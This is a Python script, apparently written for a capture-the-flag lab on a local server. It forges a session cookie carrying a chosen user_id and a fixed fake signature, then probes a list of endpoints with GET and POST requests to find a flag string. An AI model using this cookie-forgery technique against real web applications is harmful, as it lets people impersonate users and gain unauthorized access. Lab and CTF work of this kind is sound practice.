#!/usr/bin/env python3
"""
Check different endpoints and methods for the original user (10032)
Looking for the actual dashboard data and flags
"""

import requests
import base64
import re

BASE_URL = "http://127.0.0.1:33198"

def create_cookie(user_id):
    payload = f'{{"user_id":{user_id}}}'
    payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
    return f"{payload_b64}.aVfHAw."

def test_endpoint(endpoint, user_id=10032):
    """Test a specific endpoint with detailed output"""
    cookie = create_cookie(user_id)
    
    session = requests.Session()
    session.cookies.set('session', cookie, domain='127.0.0.1', path='/')
    
    url = f"{BASE_URL}{endpoint}"
    
    try:
        # Test GET
        print(f"\n{'='*60}")
        print(f"[+] Testing: GET {endpoint}")
        print(f"{'='*60}")
        
        response = session.get(url, timeout=10, allow_redirects=True)
        
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Content Length: {len(response.content)}B")
        print(f"[+] URL: {response.url}")
        print(f"[+] History: {len(response.history)} redirects")
        
        for i, resp in enumerate(response.history):
            print(f"[+] Redirect {i+1}: {resp.status_code} -> {resp.url}")
        
        # Look for flags
        flag_match = re.search(r'FLAG\{[^}]{10,}\}', response.text)
        if flag_match:
            print(f"\n{'!'*50}")
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"{'!'*50}")
            return flag_match.group(0)
        
        # Show content
        if len(response.content) > 100:
            print(f"\n[+] Content Preview:")
            print(response.text[:500])
        
        # Test POST on same endpoint
        print(f"\n{'='*60}")
        print(f"[+] Testing: POST {endpoint}")
        print(f"{'='*60}")
        
        response_post = session.post(url, data={'test': 'data'}, timeout=10)
        print(f"[+] Status: {response_post.status_code}")
        print(f"[+] Content Length: {len(response_post.content)}B")
        
        flag_match_post = re.search(r'FLAG\{[^}]{10,}\}', response_post.text)
        if flag_match_post:
            print(f"\n{'!'*50}")
            print(f"[!] FLAG FOUND (POST): {flag_match_post.group(0)}")
            print(f"{'!'*50}")
            return flag_match_post.group(0)
        
        return None
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def main():
    print("="*80)
    print("FINDING FLAG - TESTING ALL POSSIBLE ENDPOINTS")
    print("="*80)
    
    # List of endpoints to test
    endpoints_to_test = [
        "/",
        "/dashboard",
        "/home",
        "/index",
        "/main",
        "/panel",
        "/user",
        "/profile",
        "/account",
        "/settings",
        "/admin",
        "/api/dashboard",
        "/api/user",
        "/api/profile",
        "/data",
        "/info",
        "/view",
        "/display"
    ]
    
    print("\n[+] Testing endpoints with user_id=10032 (John Doe)")
    print("[+] Looking for flag in response content...")
    
    flag_found = None
    
    for endpoint in endpoints_to_test:
        flag = test_endpoint(endpoint, user_id=10032)
        if flag:
            flag_found = flag
            break
    
    if not flag_found:
        print("\n" + "="*80)
        print("NO FLAG FOUND IN TESTED ENDPOINTS")
        print("="*80)
        print("\n[+] All endpoints tested with user_id=10032")
        print("[+] The flag may be:")
        print("    1. In a user_id we haven't tested yet")
        print("    2. Require a specific parameter or header")
        print("    3. Be hidden in JavaScript or other resources")
        print("    4. Require a different exploitation method")

if __name__ == "__main__":
    main()

